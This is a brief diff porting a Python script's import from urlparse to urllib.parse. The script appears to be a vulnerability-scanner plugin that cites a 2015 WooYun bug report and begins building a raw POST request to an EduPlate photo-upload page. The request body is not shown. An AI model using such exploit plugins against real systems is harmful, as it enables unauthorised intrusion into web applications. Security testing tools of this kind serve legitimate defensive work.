@@ -5,7 +5,7 @@
 # date:2015-08-10
 # from:http://www.wooyun.org/bugs/wooyun-2015-0111072
 
-import re,urlparse
+import re,urllib.parse
 
 def com_pack(state):
     return '''POST /EduPlate/TradeUnionBlog/TradeUnionPhtoAdd.aspx HTTP/1.1
